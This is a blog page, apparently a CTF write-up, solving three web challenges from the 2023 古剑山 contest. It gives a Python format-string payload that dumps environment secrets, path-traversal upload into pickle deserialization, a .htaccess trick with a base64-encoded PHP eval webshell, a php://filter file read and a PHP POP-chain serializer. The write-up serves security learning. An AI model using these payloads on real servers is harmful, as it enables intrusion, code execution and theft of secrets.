@@ -1,0 +1,383 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>[2023古剑山]WEB WP | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="[2023古剑山]WEB WP | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+摸🐟
+
+easy_pickle
+dirsearch扫出源码
+# ! /usr/bin/env python
+# -*- coding: utf-8 -*-
+# __author__ = &quot;JrXnm&quot;
+# Date:..." />
+    <meta name="keywords" content="文件上传,Pickle,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              [2023古剑山]WEB WP
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-12-08
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/we509Cp-fk/" class="post-tag">
+                  # 文件上传
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/GFaUKRKUb/" class="post-tag">
+                  # Pickle
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/2023-gu-jian-shan-web-wp.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <blockquote>
+<p>摸🐟</p>
+</blockquote>
+<h1 id="easy_pickle">easy_pickle</h1>
+<p>dirsearch扫出源码</p>
+<pre><code class="language-python"># ! /usr/bin/env python
+# -*- coding: utf-8 -*-
+# __author__ = &quot;JrXnm&quot;
+# Date: 19-6-10
+from flask import Flask, request, \
+    session, g, redirect, url_for, \
+    abort, render_template, flash, \
+    render_template_string
+import os
+from settings import *
+import pickle
+import re
+import traceback
+
+app = Flask(__name__)
+app.config.update(dict(
+    DATABASE='',
+    DEBUG=True,
+    SECRET_KEY=os.environ.get('SECRET_KEY'),
+))
+app.config.from_envvar('FLASKR_SETTINGS', silent=True)
+
+
+class ErrorHandler():
+    def __init__(self):
+        self.notfound = &quot;Oops! That page doesn't exist.&quot;
+        self.badreqyest = &quot;Your Rquest We Could Not Understand&quot;
+
+
+@app.errorhandler(404)
+def page_not_found(error):
+    template = '''
+    &lt;div class=&quot;center-content error&quot;&gt;
+        &lt;h1&gt;{error.notfound} !!!&lt;/h1&gt;
+        &lt;h2&gt;''' + request.url + '''&lt;/h2&gt;
+    &lt;/div&gt;
+    '''
+    error = ErrorHandler()
+    return template.format(error=error), 404
+
+
+def get_books(book_name=None):
+    if book_name:
+        try:
+            with open('./books/' + book_name, 'rb') as f:
+                book = pickle.load(f)
+            return book
+        except:
+            return None
+    else:
+        books = []
+        dirs = ['白夜行', '解忧杂货店', '旧日向晚', '围城', '小王子', '追风筝的人']
+        for book_name in dirs:
+            try:
+                with open('./books/' + book_name, 'rb') as f:
+                    book = pickle.load(f)
+            except:
+                continue
+            books.append(book)
+        return books
+
+
+def save_book(book_name, book_bio, book_img, book_price, book_num):
+    book = pickle.dumps((book_name, book_img, book_bio, book_price, book_num))
+    with open('./books/' + book_name, 'wb') as f:
+        f.write(book)
+
+
+@app.route(&quot;/bookAdd&quot;, methods=['POST', 'GET'])
+def upload():
+    if session.get('logged_in', None) and session.get('name', None) == 'admin':
+        if request.method == 'POST':
+            try:
+                book_name = request.form.get('book_name')
+                book_bio = request.form.get('book_bio')
+                book_price = int(request.form.get('book_price'))
+                book_num = int(request.form.get('book_num'))
+
+                f = request.files['myfile']
+                book_img = f.filename
+                save_book(book_name, book_bio, book_img, book_price, book_num)
+                f.save(&quot;./static/img/&quot; + f.filename)
+            except Exception as e:
+                traceback.print_exc()
+                return &quot;Something Wrong!!!&quot;
+            return &quot;Book Add Success&quot;
+        else:
+            return render_template('tmpl/bookAdd.html')
+    return 'You are not login'
+
+
+# 主页
+@app.route('/')
+@app.route('/index')
+def index():
+    if session.get('logged_in', None):
+        name = session.get('name')
+        if name == 'admin':
+            return render_template('index.html')
+    else:
+        session['logged_in'] = 0
+        session['name'] = 'Anonymous'
+        msg = 'Please Login First, {} '
+
+    return render_template('index.html', msg=msg.format(session.get('name')))
+
+
+@app.route('/bookDetail/&lt;string:book_name&gt;')
+def book_detail(book_name):
+    book = get_books(book_name)
+    return render_template('tmpl/bookDetail.html', book=book)
+
+
+@app.route('/backup')
+def hint():
+    return open(__file__).read()
+
+
+@app.route('/bookList')
+def book_list():
+    books = get_books()
+    return render_template('tmpl/bookList.html', books=books)
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', debug=False, port=8080)
+</code></pre>
+<p><code>@app.errorhandler(404)</code>存在格式化字符串漏洞，用这个先读环境变量里的SECRET_KEY。<code>error</code>是这个环境中的一个对像，而这里也直接引入了os模块，所以直接在globals里面拿就行了。</p>
+<pre><code class="language-python">/{error.__init__.__globals__[os].__dict__[environ]}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1702045075972.png" alt="" loading="lazy"></figure>
+<p>pickle反序列化。<code>get_books</code>里有<code>pickle.load(f)</code>，<code>/bookAdd</code>可以写入文件。注意<code>save_book</code>写入的是一个元组，这是没法写入恶意类的。</p>
+<p>但是这里对<code>request.files['myfile']</code>是直接写入的，而且没有对文件名称处理，因此可以目录穿越</p>
+<pre><code class="language-python">f = request.files['myfile']
+f.save(&quot;./static/img/&quot; + f.filename)
+</code></pre>
+<p>这里可以覆盖<code>./book/白夜行</code>然后访问<code>/bookList</code>，或随便写一个访问<code>/bookDetail/xxx</code>。<br>
+<img src="https://skyblu3519.github.io/post-images/1702045111537.png" alt="" loading="lazy"></p>
+<p>弹个shell，拿到flag<br>
+<img src="https://skyblu3519.github.io/post-images/1702045185892.jpg" alt="" loading="lazy"></p>
+<p>另外也可以覆盖<code>index.html</code>，直接用模版执行代码。</p>
+<h1 id="upload_2_shell">upload_2_shell</h1>
+<p>使用XBM文件头，上传.htaccess。</p>
+<pre><code>#define width 1337
+#define height 1337
+AddType application/x-httpd-php .sky
+php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.sky&quot;
+</code></pre>
+<p>因为对文件内容过滤了&lt;?，所以使用base64编码。</p>
+<p>上传shell.sky，用'12'补足base64解码所需的8字节</p>
+<pre><code>GIF89a12
+PD9waHAgZXZhbCgkX1JFUVVFU1RbJ3NreSddKTs/Pg==
+</code></pre>
+<p>成功getshell<br>
+<img src="https://skyblu3519.github.io/post-images/1702045297417.png" alt="" loading="lazy"></p>
+<h1 id="unse">unse</h1>
+<p>php伪协议读文件<code>/index.php?fun=php://filter/read=convert.base64-encode/resource=test.php</code></p>
+<p>cfun处可以令<code>$tmp='flag'</code>来读取<code>$flag</code>，构造pop链</p>
+<pre><code class="language-php">&lt;?php
+class afun {
+    private $a;
+    public function __construct(){
+        $this-&gt;a = new bfun();
+    }
+    function __wakeup(){
+        $temp = $this-&gt;a . 'ctf';
+    }
+}
+
+class bfun {
+    private $items = array();
+    public function __construct(){
+        $this-&gt;items = array(&quot;dd&quot;=&gt;new cfun());
+    }
+}
+
+class cfun {
+    private $params;
+    public function __construct(){
+        $this-&gt;params = array(&quot;knife&quot;=&gt;&quot;flag&quot;);
+    }
+}
+
+
+$a = new afun();
+echo serialize($a);
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#easy_pickle">easy_pickle</a></li>
+<li><a href="#upload_2_shell">upload_2_shell</a></li>
+<li><a href="#unse">unse</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/2023-xiang-shan-bei-jue-sai-ezcache/">
+              <h3 class="post-title">
+                [2023香山杯决赛]Ezcache
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
